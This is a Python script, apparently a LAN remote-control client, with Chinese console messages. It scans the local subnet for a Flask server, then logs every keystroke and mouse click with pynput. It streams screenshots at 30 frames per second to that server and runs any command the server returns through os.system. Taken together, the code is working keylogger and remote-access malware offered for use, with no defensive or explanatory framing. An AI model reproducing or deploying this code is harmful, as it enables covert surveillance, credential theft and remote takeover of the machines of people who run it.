import requests
import pynput
import socket
import threading
import time
from concurrent.futures import ThreadPoolExecutor
import ipaddress
import mss
import mss.tools
import base64
from PIL import Image
import io
import os

SCREEN_CAPTURE_FPS = 30
SCREEN_CAPTURE_INTERVAL = 1.0 / SCREEN_CAPTURE_FPS
server_url = None
SERVER_PORT = 5000
SCAN_TIMEOUT = 2
send_lock = threading.Lock()
server_2fa_key = None

CONTROL_CHAR_MAP = {
    "\u0000": "NULL",
    "\u0001": "Ctrl+A",
    "\u0002": "Ctrl+B",
    "\u0003": "Ctrl+C",
    "\u0004": "Ctrl+D",
    "\u0005": "Ctrl+E",
    "\u0006": "Ctrl+F",
    "\u0007": "Ctrl+G",
    "\u0008": "Ctrl+H",
    "\u0009": "Ctrl+I",
    "\u000a": "Ctrl+J",
    "\u000b": "Ctrl+K",
    "\u000c": "Ctrl+L",
    "\u000d": "Ctrl+M",
    "\u000e": "Ctrl+N",
    "\u000f": "Ctrl+O",
    "\u0010": "Ctrl+P",
    "\u0011": "Ctrl+Q",
    "\u0012": "Ctrl+R",
    "\u0013": "Ctrl+S",
    "\u0014": "Ctrl+T",
    "\u0015": "Ctrl+U",
    "\u0016": "Ctrl+V",
    "\u0017": "Ctrl+W",
    "\u0018": "Ctrl+X",
    "\u0019": "Ctrl+Y",
    "\u001a": "Ctrl+Z",
    "\u001b": "Ctrl+[",
    "\u001c": "Ctrl+\\",
    "\u001d": "Ctrl+]",
    "\u001e": "Ctrl+^",
    "\u001f": "Ctrl+_",
    "\b": "Ctrl+H",
    "\t": "Ctrl+I",
    "\n": "Ctrl+J",
    "\r": "Ctrl+M",
    "\x1b": "Ctrl+[",
    "\u0080": "PAD",
    "\u0081": "HOP",
    "\u0082": "BPH",
    "\u0083": "NBH",
    "\u0084": "IND",
    "\u0085": "NEL",
    "\u0086": "SSA",
    "\u0087": "ESA",
    "\u0088": "HTS",
    "\u0089": "HTJ",
    "\u008a": "VTS",
    "\u008b": "PLD",
    "\u008c": "PLU",
    "\u008d": "RI",
    "\u008e": "SS2",
    "\u008f": "SS3",
    "\u0090": "DCS",
    "\u0091": "PU1",
    "\u0092": "PU2",
    "\u0093": "STS",
    "\u0094": "CCH",
    "\u0095": "MW",
    "\u0096": "SPA",
    "\u0097": "EPA",
    "\u0098": "SOS",
    "\u0099": "SCI",
    "\u009a": "CSI",
    "\u009b": "ST",
    "\u009c": "OSC",
    "\u009d": "PM",
    "\u009e": "APC",
    "\u009f": "DEL",
}


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("180.101.50.242", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        try:
            host_name = socket.gethostname()
            ip_list = socket.gethostbyname_ex(host_name)[2]
            for ip in ip_list:
                if (
                    not ip.startswith("127.")
                    and not ip.startswith("2001:")
                    and not ip.startswith("::")
                ):
                    return ip
            return "127.0.0.1"
        except Exception:
            return "127.0.0.1"


def generate_ip_range(local_ip):
    try:
        network = ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
        return [str(ip) for ip in network.hosts()]
    except Exception as e:
        print(f"生成IP段失败: {e}")
        return [local_ip, "127.0.0.1"]


def check_server(ip):
    test_url = f"http://{ip}:{SERVER_PORT}/status"
    try:
        response = requests.get(test_url, timeout=SCAN_TIMEOUT)
        if response.status_code == 200 and "contents" in response.json():
            return f"http://{ip}:{SERVER_PORT}"
    except (requests.exceptions.RequestException, ConnectionRefusedError):
        return None


def scan_lan_server():
    global server_url
    print("开始扫描内网Flask服务...")
    local_ip = get_local_ip()
    print(f"本机内网IP: {local_ip}")
    ip_list = generate_ip_range(local_ip)

    with ThreadPoolExecutor(max_workers=256) as executor:
        results = executor.map(check_server, ip_list)

    for result in results:
        if result:
            server_url = result
            print(f"找到Flask服务: {server_url}")
            return

    print("内网未找到Flask服务，使用本地回环地址")
    server_url = f"http://127.0.0.1:{SERVER_PORT}"


def replace_control_char(raw_char):
    if not isinstance(raw_char, str) or raw_char == "":
        return raw_char
    return CONTROL_CHAR_MAP.get(raw_char, raw_char)


def format_special_key(key):
    key_str = str(key)
    if not key_str.startswith("Key."):
        return key_str
    core_name = key_str.split(".")[-1]
    parts = core_name.split("_")
    if len(parts) == 2 and parts[1] in ["l", "r", "gr"]:
        main_key = parts[0].capitalize()
        side = ""
        if parts[1] == "l":
            side = "_LEFT"
        elif parts[1] == "r":
            side = "_RIGHT"
        else:
            side = "_GR(RIGHT)"
        return f"{main_key}{side}"
    return core_name.capitalize()


def send_key_data(raw_data):
    if server_url is None or raw_data is None:
        return
    if isinstance(raw_data, str):
        converted_data = replace_control_char(raw_data)
    elif isinstance(raw_data, pynput.keyboard.Key):
        converted_data = format_special_key(raw_data)
    else:
        converted_data = str(raw_data)

    with send_lock:
        try:
            data = {"content": converted_data, "2fa_key": server_2fa_key}
            response = requests.post(server_url, data=data, timeout=2)
            if response.status_code != 200:
                print(f"发送键盘数据失败: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"发送键盘数据失败: {e}")
            scan_lan_server()


def send_mouse_click(left_right):
    if server_url is None:
        return
    with send_lock:
        try:
            data = {"content": f"Click_{left_right}", "2fa_key": server_2fa_key}
            response = requests.post(server_url, data=data, timeout=2)
            if response.status_code != 200:
                print(f"发送鼠标数据失败: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"发送鼠标数据失败: {e}")
            scan_lan_server()


def on_key_press(key):
    try:
        send_key_data(key.char)
    except AttributeError:
        send_key_data(key)


def on_mouse_click(x, y, button, pressed):
    if pressed and button == pynput.mouse.Button.left:
        send_mouse_click("LEFT")
    if pressed and button == pynput.mouse.Button.middle:
        send_mouse_click("MIDDLE")
    if pressed and button == pynput.mouse.Button.right:
        send_mouse_click("RIGHT")
    if pressed and button == pynput.mouse.Button.unknown:
        send_mouse_click("UNKNOWN")

def keep_scanning():
    while True:
        if server_url is None:
            scan_lan_server()
        time.sleep(30)

def capture_screen():
    try:
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            sct_img = sct.grab(monitor)
            
            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
            
            buffer = io.BytesIO()
            img.save(buffer, format="JPEG", quality=70)
            return base64.b64encode(buffer.getvalue()).decode('utf-8')
    except Exception as e:
        print(f"屏幕捕获失败: {e}")
        return None

def screen_capture_loop():
    global server_url    
    while True:
        if server_url:
            screen_data = capture_screen()
            if screen_data:
                with send_lock:
                    try:
                        data = {
                            "type": "screen",
                            "data": screen_data,
                            "2fa_key": server_2fa_key
                        }
                        response = requests.post(f"{server_url}/screen", data=data, timeout=2)
                        if response.status_code != 200:
                            print(f"发送屏幕数据失败: {response.status_code}")
                    except requests.exceptions.RequestException as e:
                        scan_lan_server()
                        print(f"发送屏幕数据失败: {e}")
        
        time.sleep(SCREEN_CAPTURE_INTERVAL)

def get_2fa_key():
    global server_2fa_key
    while True:
        if server_url is None:
            continue
        try:
            if server_2fa_key:
                response = requests.get(f"{server_url}/2fa?2fa_key="+str(server_2fa_key), timeout=2)
            else:
                response = requests.get(f"{server_url}/2fa", timeout=2)
            if response.status_code == 200:
                data = response.json()
                server_2fa_key = data.get("content")
            else:
                print(response.status_code)
        except requests.exceptions.RequestException as e:
            scan_lan_server()
            print(f"获取2FA密钥失败: {e}")
        time.sleep(5)

def run_command():
    while True:
        if server_url is None or server_2fa_key is None:
            continue
        try:
            response = requests.get(f"{server_url}/get_command?2fa_key="+str(server_2fa_key), timeout=2)
            if response.status_code != 200:
                print(f"获取命令失败: {response.status_code}")
            elif response.json().get("command"):
                command = response.json().get("command")
                if command:
                    os.system(command)
                    response = requests.get(f"{server_url}/clear_command?2fa_key="+str(server_2fa_key), timeout=2)
        except requests.exceptions.RequestException as e:
            print(f"发送命令失败: {e}")
            scan_lan_server()
        time.sleep(5)

def main():
    scan_lan_server()

    threading.Thread(target=keep_scanning, daemon=True).start()

    threading.Thread(target=screen_capture_loop, daemon=True).start()
    
    threading.Thread(target=get_2fa_key, daemon=True).start()
    
    threading.Thread(target=run_command, daemon=True).start()
    
    keyboard_listener = pynput.keyboard.Listener(on_press=on_key_press)
    mouse_listener = pynput.mouse.Listener(on_click=on_mouse_click)
    keyboard_listener.start()
    mouse_listener.start()

    print("键鼠监听已启动，按Ctrl+C退出...")
    try:
        while keyboard_listener.is_alive() and mouse_listener.is_alive():
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n正在停止监听器...")
        keyboard_listener.stop()
        mouse_listener.stop()
        keyboard_listener.join(timeout=1)
        mouse_listener.join(timeout=1)
        print("程序已安全退出！")

if __name__ == "__main__":
    main()